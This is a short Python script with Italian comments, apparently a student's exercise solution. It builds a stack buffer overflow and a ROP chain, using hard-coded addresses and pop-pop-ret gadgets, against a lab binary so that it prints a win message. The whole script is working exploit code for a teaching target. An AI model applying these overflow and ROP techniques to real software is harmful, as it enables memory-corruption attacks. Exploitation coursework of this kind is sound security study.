#note: e` l'exploit 2

import os
import struct

#comando per chiamare: cat badfile badfile1 - | exploit-stampa.py

#bisognava stampare "congratulations you win" andando a sfruttare la gets dentro read_file: e poi chiamare la funzione join_string mettendo str2 in str1 e poi chiamando lazy che stampa
#bisogna chiamare read_file tramite la gets in echo() poi dentro read_file devo riuscire a passare l'if (quindi bisogna mettere flag a 1 e mettere magicword al valore richiesto) e nel secondo overflow devo chiamare join_string
#si usa il primo exploit ?

#quindi: echo() deve chiamare read_file() poi read_file() entra nell'if, fa overflow che e` un rop che permette di chiamare join_string() e lazy()

flag = 0x0804a064 #da info variables

#bisogna passare tra funzioni: servono gli indirizzi -> chiamare read_file, join_string e laxy
read_file = 0x80485b2
join_string = 0x80484cb
lazy = 0x804858d

ret = 0x08048336 #di fianco a ret c'era 0xeac1
pop_ret = 0x08048768
pop_pop_ret = 0x080487ca
#da info variables
str1 = 0x0804a184
str2 = 0x0804a040

#prima fase di attacco:
#questa prima parte e` esattamente l'exploit di prima pero` invece di mettere lo shellcode nei 120 caratteri metto prima tutte A
payload = "A"*120 #siamo dentro read_file, prendiamo buffer1 e andiamo a sovrascrivere fino a subito prima di p

#dopo i 120 mettiamo la flag
payload += struct.pack("I", flag) #dobbiamo entrare nell'indirizzo di flag

##come ha fatto il prof, da capire:
#qui sovrascriviamo read_file
payload += struct.pack("I", read_file)
payload += struct.pack("I", read_file)
payload += struct.pack("I", read_file)
payload += struct.pack("I", read_file)
payload += struct.pack("I", read_file)
#il valore che vogliamo inserire
payload += struct.pack("I", 0xfefefefe)
payload += struct.pack("I", 0xfefefefe)
#e poi lui faceva payload += struct.pack("B", 0x0a) dove B sarebbe per il format char e segnalava che 0x0a era il suo ret
payload += struct.pack("I", ret)

#//// questo secondo overflow e` un rop che permette di mettere in str2 la nostra frase
#join_string(string, str1) gadget
#siamo dentro read_file: il num di join_string sufficiente per arrivare a sovrascrivere il return address con join_string, si puo` fare anche con il padding
#pop_pop_ret per i due parametri di join_string
payload1 = struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)
#str2 dentro str1
payload1 += struct.pack("I", str1)
payload1 += struct.pack("I", str2)
payload1 += struct.pack("I", lazy)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()

f = open("badfile1", "a")
f.write("%s" % payload1)
f.close()





